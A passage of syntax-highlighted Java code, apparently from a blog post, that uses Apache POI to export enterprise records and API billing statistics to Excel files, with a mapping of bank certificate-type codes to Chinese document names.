class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                TMonitorReport tMonitorReport = list.get(j);</span><br><span class="line">                String entCertType = getCertType(tMonitorReport.getEntCertType());</span><br><span class="line">                String bankUid = tMonitorReport.getBankUid();</span><br><span class="line">                String bankSocialNo = tMonitorReport.getEntNo();</span><br><span class="line">                String bankEntName = tMonitorReport.getEntName();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(entCertType);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(bankUid);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            cell.setCellValue(bankSocialNo);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            cell.setCellValue(bankEntName);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createExcelmportEntQz</span><span class="params">(HttpServletResponse response, List&lt;ImportEntQz&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;bankUid&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;entName&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;NSRSBH&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;SHXYDM&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                ImportEntQz importEntQz = list.get(j);</span><br><span class="line">                String bankUid = importEntQz.getBankUid();</span><br><span class="line">                String entName = importEntQz.getEntName();</span><br><span class="line">                String NSRSBH = importEntQz.getNSRSBH();</span><br><span class="line">                String SHXYDM = importEntQz.getSHXYDM();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(bankUid);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(entName);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            cell.setCellValue(NSRSBH);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            cell.setCellValue(SHXYDM);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*泉州银行证件类型配置*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCertType</span><span class="params">(String certType)</span> </span>&#123;</span><br><span class="line">        String entCertType = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (certType) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;0&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;身份证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;户口簿&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;护照&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;3&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;军官证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;4&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;士兵证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;5&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;港澳居民来往内地通行证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;6&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;台湾同胞来往内地通行证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;7&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;临时身份证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;8&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;外国人居留证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;9&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;警官证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;99&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;其他证件-个人&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;X&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;其他证件&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;a&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;组织机构代码证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;b&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;营业执照&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;c&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;贷款卡&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;g&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;统一社会信用代码证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;h&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;批文&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;i&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;主管证明&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;j&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;民办非企业登记证书&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;k&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;社会团体法人登记证书&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;l&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;事业单位法人登记证书&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;m&quot;</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;港澳台居民居住证&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                entCertType = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> entCertType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createImpQz</span><span class="params">(HttpServletResponse response, List&lt;ImportEntQz&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;银行主键(bankUid)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业ID(entUid)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业名称(entName)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;统一社会信用代码(entRegNo)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;法定代表人(legalPerson)&quot;</span>);</span><br><span class="line"></span><br><span class="line">            title.add(<span class="string">&quot;登记机关(entRegUnit)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;成立日期(entRegDt)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;登记状态(entstatus)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业类型(entType)&quot;</span>);</span><br><span class="line"></span><br><span class="line">            title.add(<span class="string">&quot;注册资本(entRegAmount)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;单位(regcapunit)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;币种(regcapcur)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;营业期限(起止)(entdeadline)&quot;</span>);</span><br><span class="line"></span><br><span class="line">            title.add(<span class="string">&quot;核准日期(approvalDate)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业地址(entAddress)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;经营范围(entRange)&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;历史名称(entHisName)&quot;</span>);</span><br><span class="line"></span><br><span class="line">            title.add(<span class="string">&quot;所属行业(industryconame)&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">//设置背景颜色</span></span><br><span class="line"><span class="comment">//            style.setFillForegroundColor(HSSFColor.LIME.index);</span></span><br><span class="line">            style.setFillForegroundColor(HSSFColor.HSSFColorPredefined.GREEN.getIndex());</span><br><span class="line">            style.setFillBackgroundColor(HSSFColor.HSSFColorPredefined.GREEN.getIndex());</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                ImportEntQz importEntQz = list.get(j);</span><br><span class="line">                String bankUid = importEntQz.getBankUid();</span><br><span class="line">                String entName = importEntQz.getEntName();</span><br><span class="line">                String NSRSBH = importEntQz.getNSRSBH();</span><br><span class="line">                String SHXYDM = importEntQz.getSHXYDM();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(bankUid);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            cell.setCellValue(entName.replaceAll(<span class="string">&quot;（&quot;</span>, <span class="string">&quot;(&quot;</span>).replaceAll(<span class="string">&quot;）&quot;</span>, <span class="string">&quot;)&quot;</span>).replaceAll(<span class="string">&quot;\\(车购税\\)&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            cell.setCellValue(SHXYDM);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*通用输出方法*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExcelIo</span><span class="params">(HttpServletResponse response, HSSFWorkbook workbook)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            workbook.write(os);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] content = os.toByteArray();</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(content);</span><br><span class="line">        <span class="comment">// 设置response参数，可以打开下载页面</span></span><br><span class="line"><span class="comment">//            response.setHeader(&quot;Content-Disposition&quot; ,&quot;attachment;filename=&quot;+new String((&quot;tre&quot;+&quot;.xls&quot;).getBytes(),&quot;ISO-8859-1&quot;));</span></span><br><span class="line"><span class="comment">//            response.setContentType(&quot;application/msexcel;charset=GBK&quot;);</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/msdownload&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span></span><br><span class="line">                + URLEncoder.encode(<span class="string">&quot;qz_report.xls&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        response.reset();</span><br><span class="line"><span class="comment">//            response.setContentType(&quot;application/vnd.ms-excel;charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">//            response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot; + new String((&quot;qz_report&quot; + &quot;.xls&quot;).getBytes(&quot;gb2312&quot;), &quot;iso-8859-1&quot;));</span></span><br><span class="line">        ServletOutputStream out = response.getOutputStream();</span><br><span class="line">        BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">        BufferedOutputStream bos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            bis = <span class="keyword">new</span> BufferedInputStream(is);</span><br><span class="line">            bos = <span class="keyword">new</span> BufferedOutputStream(out);</span><br><span class="line">            <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="keyword">int</span> bytesRead;</span><br><span class="line">            <span class="comment">// Simple read/write loop.</span></span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != (bytesRead = bis.read(buff, <span class="number">0</span>, buff.length))) &#123;</span><br><span class="line">                bos.write(buff, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (bis != <span class="keyword">null</span>) &#123;</span><br><span class="line">                bis.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (bos != <span class="keyword">null</span>) &#123;</span><br><span class="line">                bos.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportBillingStatistics</span><span class="params">(HttpServletResponse response, List&lt;BillingStatisticsMap&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;客户名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口调用次数&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口单价&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口总价&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;统计周期&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            cellStyle.setDataFormat(HSSFDataFormat.getBuiltinFormat(&quot;0.00&quot;));</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; list.size(); j++) &#123;</span><br><span class="line">                HSSFRow contentRow = sheet.createRow(j + <span class="number">1</span>);</span><br><span class="line">                BillingStatisticsMap billingStatisticsMap = list.get(j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; title.size(); k++) &#123;</span><br><span class="line">                    HSSFCell cell = contentRow.createCell(k);</span><br><span class="line">                    <span class="keyword">switch</span> (k) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsMap.getUserName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsMap.getDataitemUName());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsMap.getCount());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsMap.getActualPrice() + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsMap.getAllPrice() + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                            cell.setCellValue(billingStatisticsMap.getRangeTime());</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    cell.setCellStyle(cellStyle);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writeExcelIo(response, workbook);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportBillingStatisticsDetail</span><span class="params">(HttpServletResponse response, List&lt;BillingStatisticsDetailMap&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;用户名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;企业名称&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;调用日期&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;有无内容&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;返回结果&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;接口单价（元）&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span class="line">                <span class="comment">// 设置excel每列宽度</span></span><br><span class="line">                sheet.setColumnWidth(i, <span class="number">5000</span>);</span><br><span class="line">                HSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellValue(title.get(i));</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建内容行</span></span><br><span class="line">            HSSFCellStyle cellStyle = workbook.createCellStyle();</span><br><span class="line">            cellStyle.setWrapText(<span class="keyword">true</span>);<span class="comment">// 自动换行</span></span><br><span class="line"><span class="comment">//            